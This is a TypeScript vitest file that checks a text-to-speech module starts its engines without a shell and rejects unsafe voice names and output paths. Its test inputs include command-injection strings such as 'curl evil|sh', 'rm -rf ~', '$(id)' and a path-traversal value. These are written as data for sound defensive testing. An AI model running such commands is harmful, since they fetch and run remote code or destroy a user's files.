import { join } from 'node:path'
import { tmpdir } from 'node:os'
import { beforeEach, describe, expect, it, vi } from 'vitest'

// MI-5: text, voice and output path are model-controlled. Local TTS engines
// must be started without a shell and with validated voice/output path.

const childProcess = vi.hoisted(() => ({
    execSync: vi.fn(() => ''),
    execFileSync: vi.fn(() => ''),
}))
vi.mock('node:child_process', () => childProcess)

import { speak } from './text-to-speech.js'

const INJECTION = 'Hallo $(touch /tmp/pwned) `id` "; curl x|sh; "'

beforeEach(() => {
    childProcess.execSync.mockClear()
    childProcess.execFileSync.mockClear()
})

describe('MI-5 TTS never builds shell strings', () => {
    it.each(['edge', 'piper', 'macos-say'] as const)('%s passes text as data, not through a shell', async provider => {
        const result = await speak({ text: INJECTION, provider })
        expect(result.success).toBe(true)
        expect(childProcess.execSync).not.toHaveBeenCalled()
        expect(childProcess.execFileSync).toHaveBeenCalledTimes(1)
        const [file, args, options] = childProcess.execFileSync.mock.calls[0] as unknown as [string, string[], { input?: string }]
        expect(file).not.toMatch(/sh$|bash|cmd\.exe/)
        const carriesText = args.some(arg => arg.includes(INJECTION)) || options.input === INJECTION
        expect(carriesText).toBe(true)
    })

    it.each(['x" ; curl evil|sh ; "', '--help', '$(id)', '../../etc/voice', 'a;b'])('rejects voice %s before any process starts', async voice => {
        const result = await speak({ text: 'hi', provider: 'edge', voice })
        expect(result.success).toBe(false)
        expect(childProcess.execSync).not.toHaveBeenCalled()
        expect(childProcess.execFileSync).not.toHaveBeenCalled()
    })

    it.each(['/home/nova/.bashrc', 'xaventra.config.json', 'out"; rm -rf ~; ".mp3x', '-o.mp3', '.hidden.mp3'])('rejects output path %s', async outputPath => {
        const result = await speak({ text: 'hi', provider: 'piper', outputPath })
        expect(result.success).toBe(false)
        expect(childProcess.execFileSync).not.toHaveBeenCalled()
    })

    it('accepts a plain audio output path and passes it as one argument', async () => {
        const outputPath = join(tmpdir(), 'nova tts test.wav')
        const result = await speak({ text: 'hi', provider: 'piper', voice: 'de_DE-thorsten-high', outputPath })
        expect(result.success).toBe(true)
        const [, args] = childProcess.execFileSync.mock.calls[0] as unknown as [string, string[]]
        expect(args).toEqual(['--model', 'de_DE-thorsten-high', '--output_file', outputPath])
    })
})
